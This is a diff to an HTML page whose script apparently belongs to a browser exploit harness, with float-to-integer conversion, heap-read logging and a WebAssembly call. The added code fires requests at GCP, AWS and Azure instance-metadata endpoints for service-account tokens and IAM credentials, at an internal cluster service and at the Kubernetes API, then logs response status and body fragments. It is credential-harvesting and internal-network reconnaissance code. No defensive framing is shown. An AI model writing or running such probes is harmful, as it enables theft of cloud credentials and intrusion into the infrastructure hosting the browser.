@@ -42,7 +42,28 @@ if(Array.isArray(m)){
   log("m3: "+f2i(m[3]).toString(16));
   log("W: "+wasmI.exports.f());
   log("HEAP_DATA_READ");
-}else{log("NO_ARR");}
-}catch(e){log("E: "+e.message);}
-log("=== DONE ===");
+
+  // Metadata probes — fire all, collect results, then print DONE
+  const probes=[
+    ["GCP","http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token",{"Metadata-Flavor":"Google"}],
+    ["GCP2","http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",{"Metadata-Flavor":"Google"}],
+    ["AWS","http://169.254.169.254/latest/meta-data/iam/security-credentials/",{}],
+    ["AZURE","http://169.254.169.254/metadata/instance?api-version=2021-02-01",{"Metadata":"true"}],
+    ["HADES","http://coingecko-proxy.hades-openbar.svc.cluster.local/api/v3/ping",{}],
+    ["K8S","https://kubernetes.default.svc/api/v1/namespaces",{}]
+  ];
+  Promise.allSettled(probes.map(([name,url,hdrs])=>
+    fetch(url,{headers:hdrs,mode:"no-cors"}).then(r=>{
+      log(name+":"+r.status+"/"+r.type);
+      if(r.type!=="opaque")return r.text().then(t=>log(name+"_B:"+t.substring(0,120)));
+    }).catch(e=>log(name+"_E:"+e.message.substring(0,40)))
+  )).then(()=>log("=== DONE ==="));
+}else{
+  log("NO_ARR");
+  log("=== DONE ===");
+}
+}catch(e){
+  log("E: "+e.message);
+  log("=== DONE ===");
+}
 </script></body></html>
